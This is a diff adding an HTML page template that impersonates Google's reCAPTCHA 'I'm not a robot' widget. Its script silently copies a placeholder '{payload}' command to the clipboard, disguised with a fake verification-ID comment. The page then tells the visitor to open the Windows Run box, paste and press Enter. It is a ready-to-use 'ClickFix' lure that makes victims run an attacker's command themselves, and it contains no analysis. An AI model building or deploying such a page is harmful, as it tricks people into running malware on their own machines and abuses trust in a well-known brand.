@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>reCAPTCHA Verification</title>
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
+        <style>
+        body {{
+            font-family: Roboto, helvetica, arial, sans-serif;
+        }}
+
+        code {{
+            font-size: 9px;
+            margin-left: 2px;
+            color: gray;
+        }}
+
+        a {{
+            color: #555;
+            text-decoration: none;
+
+            &:hover {{
+                color: #555;
+                text-decoration: underline;
+            }}
+        }}
+
+        ol {{
+            counter-reset: item;
+            list-style-type: none;
+            list-style-position: outside;
+            padding-left: 0;
+
+        }}
+
+        ol li {{
+            counter-increment: item;
+            margin-bottom: 10px;
+
+        }}
+
+        ol li::before {{
+            content: counter(item) ". ";
+            color: #1A73E8;
+            font-weight: bold;
+            margin-right: 10px;
+            margin-left: 10px;
+        }}
+
+        .checkbox-window {{
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0 12px;
+            height: 74px;
+            width: 300px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+            position: relative;
+            box-sizing: border-box;
+            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .08);
+        }}
+
+        .checkbox {{
+            border-radius: 2px;
+            background-color: #fff;
+            border: 2px solid #444746;
+            height: 28px;
+            width: 28px;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }}
+        .checkbox-window:hover .checkbox {{
+            border: 2px solid #b2b2b2;
+        }}
+
+        .im-not-a-robot {{
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 17px;
+        }}
+
+        .right-pane {{
+            width: 170px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            justify-content: center;
+            position: absolute;
+            right: 0;
+            top: 0;
+            padding-right: 12px;
+        }}
+
+        .recaptcha {{
+            font-size: 10px;
+            margin-top: 5px;
+            color: #555;
+        }}
+
+        .privacy-terms {{
+            color: #555;
+            font-size: 8px;
+        }}
+
+        .captcha-logo {{
+            margin: 0 13px 0 13px;
+        }}
+
+
+        .checkbox-desc {{
+            color: #555555;
+            position: relative;
+            font-size: 8px;
+            text-align: center;
+            bottom: 40px;
+            left: 112px;
+        }}
+
+        .spinner {{
+            visibility: hidden;
+            height: 16px;
+            width: 16px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }}
+
+        @keyframes spin {{
+            0% {{
+                transform: rotate(0deg);
+            }}
+
+            100% {{
+                transform: rotate(360deg);
+            }}
+        }}
+
+        .verify-window {{
+            position: absolute;
+            display: none;
+            top: 31px;
+            left: 18px;
+            width: 310px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+        }}
+
+        .verify-container {{
+            padding: 8px;
+        }}
+
+        .verify-header {{
+            background-color: #1A73E8;
+            padding: 16px 16px 24px 16px;
+            color: #fff;
+        }}
+
+        .verify-header-text-small {{
+            font-size: 14px;
+            line-height: normal;
+        }}
+
+        .verify-header-text-medium {{
+            font-size: 16px;
+        }}
+
+        .verify-header-text-big {{
+            font-size: 24px;
+            font-weight: 700;
+        }}
+
+        .verify-main {{
+            padding: 5px;
+            color: #111;
+            font-size: 13px;
+
+        }}
+
+        .verify-footer {{
+            border-top: 1px solid #cecece;
+            padding: 10px 7px 10px 7px;
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 102px;
+            font-size: 13px;
+        }}
+
+        .verify-footer-left {{
+            padding: 5px;
+        }}
+
+        .verify-verify-button {{
+            text-transform: uppercase;
+            background-color: #1A73E8;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 12px 0 12px 0;
+            text-decoration: none;
+            font-weight: 600;
+            height: min-content;
+            border-radius: 3px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            cursor: progress;
+        }}
+        </style>
+    </head>
+    <body>
+        <div id="checkbox-window" class="checkbox-window">
+            <button type="button" id="checkbox" class="checkbox">
+                <img class="spinner" alt="" id="spinner">
+            </button>
+            <span class="im-not-a-robot">I'm not a robot</span>
+            <div class="right-pane">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="32" height="32" class="captcha-logo" alt="">
+                <span class="recaptcha">reCAPTCHA</span>
+                <span class="privacy-terms">
+                    <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+                </span>
+            </div>
+        </div>
+        <div id="verify-window" class="verify-window">
+            <div class="verify-container">
+                <header class="verify-header">
+                    <div class="verify-header-text-medium">Complete these</div>
+                    <div class="verify-header-text-big">Verification Steps</div>
+                </header>
+                <main class="verify-main">
+                    <p>
+                        To better prove you are not a robot, please:
+                    </p>
+                    <ol>
+                        <li>
+                            Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                        </li>
+
+                        <li>
+                            In the verification window, press <b>Ctrl</b> + <b>V</b>.
+                        </li>
+
+                        <li>
+                            Press <b>Enter</b> on your keyboard to finish.
+                        </li>
+                    </ol>
+                    <p>
+                        You will observe and agree:
+                        <br>
+                    <code>
+                        ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
+                    </code>
+                    </p>
+                </main>
+            </div>
+            <footer class="verify-container verify-footer">
+                <div class="verify-footer-left">
+                    Perform the steps above to finish verification.
+                </div>
+                <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+            </footer>
+        </div>
+        <script>
+            const checkboxWindow = document.getElementById("checkbox-window");
+            const verifyWindow = document.getElementById("verify-window");
+            const checkboxSpinner = document.getElementById("spinner");
+
+            const copyClipboard = (commandToRun, id)=> {{
+                const tempTextArea = document.createElement("textarea");
+
+                tempTextArea.value = `${{commandToRun}} # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${{id}}''`;
+                document.body.append(tempTextArea);
+                tempTextArea.select();
+                document.execCommand("copy");
+                document.body.removeChild(tempTextArea);
+            }}
+
+            const showVerifyWindow = () => {{
+                const id = Math.floor(Math.random() * (9999 - 1000 + 1) + 1000).toString();
+
+                verifyWindow.style.display = "block";
+                document.getElementById('verification-id').textContent = id;
+                copyClipboard("{payload}", id);
+            }}
+
+            checkboxWindow.addEventListener("click", (event) => {{
+                setTimeout(() => {{
+                    checkboxSpinner.style.visibility = "visible";
+                    setTimeout(() => {{
+                        showVerifyWindow();
+                    }}, 400);
+                }}, 300);
+            }});
+        </script>
+    </body>
+</html>
+
